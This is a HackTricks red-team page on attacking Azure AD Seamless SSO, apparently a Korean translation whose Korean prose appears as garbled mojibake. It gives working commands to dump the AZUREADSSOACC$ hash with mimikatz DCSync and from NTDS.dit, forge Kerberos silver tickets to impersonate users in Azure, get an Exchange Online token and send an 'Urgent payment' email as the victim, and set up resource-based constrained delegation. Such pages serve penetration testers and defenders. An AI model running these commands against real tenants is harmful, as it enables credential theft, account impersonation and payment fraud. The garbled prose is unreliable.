# Az - ì‹¬ë¦¬ìŠ¤ SSO

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>ë¥¼ í†µí•´ AWS í•´í‚¹ì„ ì²˜ìŒë¶€í„° ì „ë¬¸ê°€ê¹Œì§€ ë°°ìš°ì„¸ìš”!</summary>

HackTricksë¥¼ ì§€ì›í•˜ëŠ” ë‹¤ë¥¸ ë°©ë²•:

- **íšŒì‚¬ë¥¼ HackTricksì—ì„œ ê´‘ê³ í•˜ê±°ë‚˜ HackTricksë¥¼ PDFë¡œ ë‹¤ìš´ë¡œë“œ**í•˜ê³  ì‹¶ë‹¤ë©´ [**êµ¬ë… ìš”ê¸ˆì œ**](https://github.com/sponsors/carlospolop)ë¥¼ í™•ì¸í•˜ì„¸ìš”!
- [**ê³µì‹ PEASS & HackTricks ìŠ¤ì™œê·¸**](https://peass.creator-spring.com)ë¥¼ êµ¬ë§¤í•˜ì„¸ìš”
- [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ë¥¼ ë°œê²¬í•˜ì„¸ìš”, ë‹¹ì‚¬ì˜ ë…ì  [**NFTs**](https://opensea.io/collection/the-peass-family) ì»¬ë ‰ì…˜
- ğŸ’¬ [**ë””ìŠ¤ì½”ë“œ ê·¸ë£¹**](https://discord.gg/hRep4RUj7f) ë˜ëŠ” [**í…”ë ˆê·¸ë¨ ê·¸ë£¹**](https://t.me/peass)ì— **ê°€ì…**í•˜ê±°ë‚˜ **íŠ¸ìœ„í„°** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)ë¥¼ **íŒ”ë¡œìš°**í•˜ì„¸ìš”.
- **HackTricks** ë° **HackTricks Cloud** github ì €ì¥ì†Œì— PRì„ ì œì¶œí•˜ì—¬ í•´í‚¹ íŠ¸ë¦­ì„ ê³µìœ í•˜ì„¸ìš”.

</details>

## ê¸°ë³¸ ì •ë³´

[ë¬¸ì„œì—ì„œ:](https://learn.microsoft.com/en-us/entra/identity/hybrid/connect/how-to-connect-sso) Azure Active Directory Seamless Single Sign-On (Azure AD Seamless SSO)ì€ ìë™ìœ¼ë¡œ **ì‚¬ìš©ìë¥¼ íšŒì‚¬ ì¥ì¹˜ì— ì—°ê²°ëœ ê²½ìš°ì— ë¡œê·¸ì¸**ì‹œí‚µë‹ˆë‹¤. í™œì„±í™”ë˜ë©´ **ì‚¬ìš©ìëŠ” Azure ADì— ë¡œê·¸ì¸í•  ë•Œ ë¹„ë°€ë²ˆí˜¸ë¥¼ ì…ë ¥í•  í•„ìš”ê°€ ì—†ìœ¼ë©°**, ëŒ€ê°œ ì‹¬ì§€ì–´ ì‚¬ìš©ì ì´ë¦„ë„ ì…ë ¥í•˜ì§€ ì•Šì•„ë„ ë©ë‹ˆë‹¤. ì´ ê¸°ëŠ¥ì„ í†µí•´ ì‚¬ìš©ìë“¤ì€ ì˜¨í”„ë ˆë¯¸ìŠ¤ êµ¬ì„± ìš”ì†Œê°€ í•„ìš”í•˜ì§€ ì•Šê³  í´ë¼ìš°ë“œ ê¸°ë°˜ ì• í”Œë¦¬ì¼€ì´ì…˜ì— ì‰½ê²Œ ì•¡ì„¸ìŠ¤í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

<figure><img src="../../../../.gitbook/assets/image (275).png" alt=""><figcaption></figcaption></figure>

ê¸°ë³¸ì ìœ¼ë¡œ Azure AD Seamless SSOëŠ” **ì˜¨í”„ë ˆë¯¸ìŠ¤ ë„ë©”ì¸ ê°€ì… PC**ì—ì„œ ì‚¬ìš©ìë¥¼ **ë¡œê·¸ì¸**ì‹œí‚µë‹ˆë‹¤.

[**PHS (Password Hash Sync)**](phs-password-hash-sync.md) ë° [**PTA (Pass-through Authentication)**](pta-pass-through-authentication.md)ì—ì„œ ì§€ì›ë©ë‹ˆë‹¤.

ë°ìŠ¤í¬í†± SSOëŠ” ì¸ì¦ì„ ìœ„í•´ **Kerberos**ë¥¼ ì‚¬ìš©í•©ë‹ˆë‹¤. êµ¬ì„±ëœ ê²½ìš°, Azure AD ConnectëŠ” ì˜¨í”„ë ˆë¯¸ìŠ¤ ADì— **AZUREADSSOACC`$`**ë¼ëŠ” ì»´í“¨í„° ê³„ì •ì„ ë§Œë“­ë‹ˆë‹¤. `AZUREADSSOACC$` ê³„ì •ì˜ ì•”í˜¸ëŠ” êµ¬ì„± ì¤‘ì— **í‰ë¬¸ìœ¼ë¡œ Azure ADë¡œ ì „ì†¡**ë©ë‹ˆë‹¤.

**Kerberos í‹°ì¼“**ì€ ì•”í˜¸ì˜ **NTHash (MD4)**ë¥¼ ì‚¬ìš©í•˜ì—¬ **ì•”í˜¸í™”**ë˜ë©° Azure ADëŠ” ì „ì†¡ëœ ì•”í˜¸ë¥¼ ì‚¬ìš©í•˜ì—¬ í‹°ì¼“ì„ í•´ë…í•©ë‹ˆë‹¤.

**Azure AD**ëŠ” Kerberos **í‹°ì¼“ì„ ìˆ˜ë½í•˜ëŠ” ì—”ë“œí¬ì¸íŠ¸**(https://autologon.microsoftazuread-sso.com)ë¥¼ ë…¸ì¶œí•©ë‹ˆë‹¤. ë„ë©”ì¸ ê°€ì…ëœ ê¸°ê¸°ì˜ ë¸Œë¼ìš°ì €ëŠ” SSOë¥¼ ìœ„í•´ ì´ ì—”ë“œí¬ì¸íŠ¸ë¡œ í‹°ì¼“ì„ ì „ë‹¬í•©ë‹ˆë‹¤.

### ì˜¨í”„ë ˆë¯¸ìŠ¤ -> í´ë¼ìš°ë“œ

ì‚¬ìš©ì **`AZUREADSSOACC$`ì˜ ì•”í˜¸ëŠ” ì ˆëŒ€ ë³€ê²½ë˜ì§€ ì•ŠìŠµë‹ˆë‹¤**. ë”°ë¼ì„œ ë„ë©”ì¸ ê´€ë¦¬ìëŠ” ì´ ê³„ì •ì˜ **í•´ì‹œë¥¼ ì†ìƒì‹œí‚¤ê³ ** ì´ë¥¼ ì‚¬ìš©í•˜ì—¬ **ì‹¤ë²„ í‹°ì¼“ì„ ìƒì„±**í•˜ì—¬ **ì–´ë–¤ ì˜¨í”„ë ˆë¯¸ìŠ¤ ì‚¬ìš©ìì™€ë„** Azureì— ì—°ê²°í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```powershell
# Dump hash using mimikatz
Invoke-Mimikatz -Command '"lsadump::dcsync /user:domain\azureadssoacc$ /domain:domain.local /dc:dc.domain.local"'
mimikatz.exe "lsadump::dcsync /user:AZUREADSSOACC$" exit

# Dump hash using https://github.com/MichaelGrafnetter/DSInternals
Get-ADReplAccount -SamAccountName 'AZUREADSSOACC$' -Domain contoso -Server lon-dc1.contoso.local

# Dump using ntdsutil and DSInternals
## Dump NTDS.dit
ntdsutil "ac i ntds" "ifmâ€ "create full C:\temp" q q
## Extract password
Install-Module DSInternals
Import-Module DSInternals
$key = Get-BootKey -SystemHivePath 'C:\temp\registry\SYSTEM'
(Get-ADDBAccount -SamAccountName 'AZUREADSSOACC$' -DBPath 'C:\temp\Active Directory\ntds.dit' -BootKey $key).NTHash | Format-Hexos
```
í•´ì‹œë¥¼ ì‚¬ìš©í•˜ì—¬ ì´ì œ **ì‹¤ë²„ í‹°ì¼“ì„ ìƒì„±**í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```powershell
# Get users and SIDs
Get-AzureADUser | Select UserPrincipalName,OnPremisesSecurityIdentifier

# Create a silver ticket to connect to Azure with mimikatz
Invoke-Mimikatz -Command '"kerberos::golden /user:onpremadmin /sid:S-1-5-21-123456789-1234567890-123456789 /id:1105 /domain:domain.local /rc4:<azureadssoacc hash> /target:aadg.windows.net.nsatc.net /service:HTTP /ptt"'
mimikatz.exe "kerberos::golden /user:elrond /sid:S-1-5-21-2121516926-2695913149-3163778339 /id:1234 /domain:contoso.local /rc4:12349e088b2c13d93833d0ce947676dd /target:aadg.windows.net.nsatc.net /service:HTTP /ptt" exit

# Create silver ticket with AADInternal to access Exchange Online
$kerberos=New-AADIntKerberosTicket -SidString "S-1-5-21-854168551-3279074086-2022502410-1104" -Hash "097AB3CBED7B9DD6FE6C992024BC38F4"
$at=Get-AADIntAccessTokenForEXO -KerberosTicket $kerberos -Domain company.com
## Send email
Send-AADIntOutlookMessage -AccessToken $at -Recipient "someone@company.com" -Subject "Urgent payment" -Message "<h1>Urgent!</h1><br>The following bill should be paid asap."
```
1. **ë¸Œë¼ìš°ì € ì‹œì‘:** Mozilla Firefoxë¥¼ ì‹¤í–‰í•©ë‹ˆë‹¤.
2. **ë¸Œë¼ìš°ì € êµ¬ì„±:**
   * **`about:config`**ë¡œ ì´ë™í•©ë‹ˆë‹¤.
   * [network.negotiate-auth.trusted-uris](https://github.com/mozilla/policy-templates/blob/master/README.md#authentication)ì— ëŒ€í•œ ì„¤ì •ì„ ë‹¤ìŒ [ê°’](https://docs.microsoft.com/en-us/azure/active-directory/connect/active-directory-aadconnect-sso#ensuring-clients-sign-in-automatically)ìœ¼ë¡œ ì„¤ì •í•©ë‹ˆë‹¤:
     * `https://aadg.windows.net.nsatc.net`
     * `https://autologon.microsoftazuread-sso.com`
3. **ì›¹ ì‘ìš©í”„ë¡œê·¸ë¨ ì ‘ì†:**
   * ì¡°ì§ì˜ AAD ë„ë©”ì¸ê³¼ í†µí•©ëœ ì›¹ ì‘ìš©í”„ë¡œê·¸ë¨ì— ë°©ë¬¸í•©ë‹ˆë‹¤. ì¼ë°˜ì ì¸ ì˜ˆëŠ” [Office 365](https://portal.office.com/)ì…ë‹ˆë‹¤.
4. **ì¸ì¦ í”„ë¡œì„¸ìŠ¤:**
   * ë¡œê·¸ì˜¨ í™”ë©´ì—ì„œ ì‚¬ìš©ì ì´ë¦„ì„ ì…ë ¥í•˜ê³  ë¹„ë°€ë²ˆí˜¸ í•„ë“œëŠ” ë¹„ì›Œ ë‘¡ë‹ˆë‹¤.
   * ê³„ì†í•˜ë ¤ë©´ TAB ë˜ëŠ” ENTER í‚¤ë¥¼ ëˆ„ë¦…ë‹ˆë‹¤.

{% hint style="success" %}
ì´ëŠ” MFAê°€ í™œì„±í™”ëœ ê²½ìš° MFAë¥¼ ìš°íšŒí•˜ì§€ ì•ŠìŠµë‹ˆë‹¤.
{% endhint %}

#### ~~í´ë¼ìš°ë“œ ì „ìš© ì‚¬ìš©ìë¥¼ ìœ„í•œ ì¼€ë¥´ë²„ìŠ¤ í‹°ì¼“ ìƒì„±~~ <a href="#creating-kerberos-tickets-for-cloud-only-users" id="creating-kerberos-tickets-for-cloud-only-users"></a>

ë§Œì•½ Active Directory ê´€ë¦¬ìê°€ Azure AD Connectì— ì•¡ì„¸ìŠ¤í•  ìˆ˜ ìˆë‹¤ë©´, **í´ë¼ìš°ë“œ ì‚¬ìš©ìì— ëŒ€í•œ SIDë¥¼ ì„¤ì •**í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ë ‡ê²Œ í•˜ë©´ í´ë¼ìš°ë“œ ì „ìš© ì‚¬ìš©ìì— ëŒ€í•œ ì¼€ë¥´ë²„ìŠ¤ **í‹°ì¼“ì„ ìƒì„±í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤**. ìœ ì¼í•œ ìš”êµ¬ ì‚¬í•­ì€ SIDê°€ ì ì ˆí•œ [SID](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2003/cc778824\(v=ws.10\)) ì—¬ì•¼ í•©ë‹ˆë‹¤.

{% hint style="danger" %}
í´ë¼ìš°ë“œ ì „ìš© ê´€ë¦¬ì ì‚¬ìš©ìì˜ SID ë³€ê²½ì€ í˜„ì¬ **Microsoftì— ì˜í•´ ì°¨ë‹¨**ë˜ì—ˆìŠµë‹ˆë‹¤.\
ìì„¸í•œ ì •ë³´ëŠ” [https://aadinternals.com/post/on-prem\_admin/](https://aadinternals.com/post/on-prem\_admin/)ì„ í™•ì¸í•˜ì„¸ìš”.
{% endhint %}

### ì˜¨í”„ë ˜ -> í´ë¼ìš°ë“œ ë¦¬ì†ŒìŠ¤ ê¸°ë°˜ ì œì•½ ìœ„ì„ì„ í†µí•œ ì ‘ì† <a href="#creating-kerberos-tickets-for-cloud-only-users" id="creating-kerberos-tickets-for-cloud-only-users"></a>

ì´ ê³„ì •ì´ ì†í•œ ì»¨í…Œì´ë„ˆ ë˜ëŠ” OUì—ì„œ ì»´í“¨í„° ê³„ì •(`AZUREADSSOACC$`)ì„ ê´€ë¦¬í•  ìˆ˜ ìˆëŠ” ì‚¬ìš©ìëŠ” í•´ë‹¹ ê³„ì •ì— ëŒ€í•´ **ë¦¬ì†ŒìŠ¤ ê¸°ë°˜ ì œì•½ ìœ„ì„ì„ êµ¬ì„±í•˜ê³  ì•¡ì„¸ìŠ¤í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤**.
```python
python rbdel.py -u <workgroup>\\<user> -p <pass> <ip> azureadssosvc$
```
## ì°¸ê³  ìë£Œ

* [https://learn.microsoft.com/en-us/azure/active-directory/hybrid/how-to-connect-sso](https://learn.microsoft.com/en-us/azure/active-directory/hybrid/how-to-connect-sso)
* [https://www.dsinternals.com/en/impersonating-office-365-users-mimikatz/](https://www.dsinternals.com/en/impersonating-office-365-users-mimikatz/)
* [https://aadinternals.com/post/on-prem\_admin/](https://aadinternals.com/post/on-prem\_admin/)
* [TR19: I'm in your cloud, reading everyone's emails - hacking Azure AD via Active Directory](https://www.youtube.com/watch?v=JEIR5oGCwdg)

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>ë¥¼ í†µí•´ **ì œë¡œì—ì„œ ì˜ì›…ê¹Œì§€ AWS í•´í‚¹ ë°°ìš°ê¸°**</summary>

HackTricksë¥¼ ì§€ì›í•˜ëŠ” ë‹¤ë¥¸ ë°©ë²•:

* **íšŒì‚¬ë¥¼ HackTricksì—ì„œ ê´‘ê³ í•˜ê±°ë‚˜ PDFë¡œ ë‹¤ìš´ë¡œë“œí•˜ê³  ì‹¶ë‹¤ë©´** [**êµ¬ë… ìš”ê¸ˆì œ**](https://github.com/sponsors/carlospolop)ë¥¼ í™•ì¸í•˜ì„¸ìš”!
* [**ê³µì‹ PEASS & HackTricks ìŠ¤ì™œê·¸**](https://peass.creator-spring.com)ë¥¼ êµ¬ë§¤í•˜ì„¸ìš”
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ë¥¼ ë°œê²¬í•˜ì„¸ìš”, ë‹¹ì‚¬ì˜ ë…ì  [**NFTs**](https://opensea.io/collection/the-peass-family) ì»¬ë ‰ì…˜
* **ğŸ’¬ [**ë””ìŠ¤ì½”ë“œ ê·¸ë£¹**](https://discord.gg/hRep4RUj7f) ë˜ëŠ” [**í…”ë ˆê·¸ë¨ ê·¸ë£¹**](https://t.me/peass)ì— ê°€ì…í•˜ê±°ë‚˜** íŠ¸ìœ„í„°** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**ë¥¼ íŒ”ë¡œìš°í•˜ì„¸ìš”.**
* **HackTricks** ë° [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks) ê¹ƒí—ˆë¸Œ ì €ì¥ì†Œì— PRì„ ì œì¶œí•˜ì—¬ **í•´í‚¹ íŠ¸ë¦­ì„ ê³µìœ í•˜ì„¸ìš”.**

</details>
